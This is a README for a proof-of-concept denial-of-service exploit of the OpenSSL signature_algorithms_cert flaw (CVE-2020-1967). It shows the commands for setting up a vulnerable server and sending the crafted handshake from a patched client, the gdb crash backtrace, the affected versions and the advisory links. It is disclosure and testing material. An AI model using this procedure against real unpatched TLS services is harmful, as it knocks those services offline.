# CVE-2020-1967
Proof of concept exploit about OpenSSL signature_algorithms_cert DoS flaw (CVE-2020-1967). Credit for the original finding to Bernd Edlinger, additional analysis by Matt Caswell and Benjamin Kaduk, this demo by Imre Rad.

## Prerequisite

Server or client applications that call the `SSL_check_chain()` function during or after a TLS 1.3 handshake. According to the documentation, `SSL_check_chain()` checks whether certificate x, private key pk and certificate chain chain is suitable for use with the current session s. This function call is NOT present in the popular Apache httpd or Nginx projects.

## Demo

To exploit this vulnerability, a crafted signature_algorithms_cert TLS extension needs to be submitted as part of the Hello message. I used a patched version of the openssl library to build such a client; the server is the built-in s_server openssl app, along with the -x options to activate the code path that invokes `SSL_check_chain`.

Setting up the server on a Debian stable (using the vulnerable version explicitly):

```
root@489def7f3594:/data# apt install libssl1.1=1.1.1d-0+deb10u2 openssl=1.1.1d-0+deb10u2
...

root@489def7f3594:/data# openssl version
OpenSSL 1.1.1d  10 Sep 2019

root@489def7f3594:/data# openssl s_server -cert cert.pem -key key.pem  -accept 8443 -verify 1 -tls1_3 -xkey key.pem -xcert cert.pem  -xchain cert.pem
verify depth is 1
Using default temp DH parameters
ACCEPT
```

Sending the payload using the patched client:

```
root@489def7f3594:/data# /path/to/patched/openssl s_client -connect 127.0.0.1:8443 -tls1_3 -cert cert.pem -key key.pem -sigalgs rsa_pss_rsae_sha256
CONNECTED(00000004)
Sending CVE-2020-1967 payload
...
```

And the server is supposed to segfault at this point. The core looks like this:
```
root@489def7f3594:/data/1# gdb /data/openssl-1.1.1d/apps/openssl core
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /data/openssl-1.1.1d/apps/openssl...
(No debugging symbols found in /data/openssl-1.1.1d/apps/openssl)
[New LWP 26319]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Core was generated by `/data/openssl-1.1.1d/apps/openssl s_server -cert cert.pem -key key.pem -accept'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007f09bcff3770 in tls1_check_sig_alg.part.0.cold () from /data/openssl-1.1.1d/libssl.so
(gdb) bt
#0  0x00007f09bcff3770 in tls1_check_sig_alg.part.0.cold () from /data/openssl-1.1.1d/libssl.so
#1  0x00007f09bd03f309 in tls1_check_chain () from /data/openssl-1.1.1d/libssl.so
#2  0x00007f09bd403fc8 in set_cert_cb ()
#3  0x00007f09bd037f75 in tls_post_process_client_hello () from /data/openssl-1.1.1d/libssl.so
#4  0x00007f09bd02703f in state_machine.part () from /data/openssl-1.1.1d/libssl.so
#5  0x00007f09bcffa3f8 in ssl3_write_bytes () from /data/openssl-1.1.1d/libssl.so
#6  0x00007f09bd00fbb9 in ssl_write_internal () from /data/openssl-1.1.1d/libssl.so
#7  0x00007f09bd00fd07 in SSL_write () from /data/openssl-1.1.1d/libssl.so
#8  0x00007f09bd3e337d in sv_body ()
#9  0x00007f09bd40757a in do_server ()
#10 0x00007f09bd3e7c27 in s_server_main ()
#11 0x00007f09bd3cea46 in do_cmd ()
#12 0x00007f09bd3b89fd in main ()
```

## Affected versions

Affected versions are: OpenSSL 1.1.1d, 1.1.1e, and 1.1.1f.
The first fixed version is OpenSSL 1.1.1g.

## References

- https://www.openssl.org/news/secadv/20200421.txt

- https://github.com/openssl/openssl/issues/11500

- https://github.com/openssl/openssl/commit/a87f3fe01a5a894aa27ccd6a239155fd129988e4

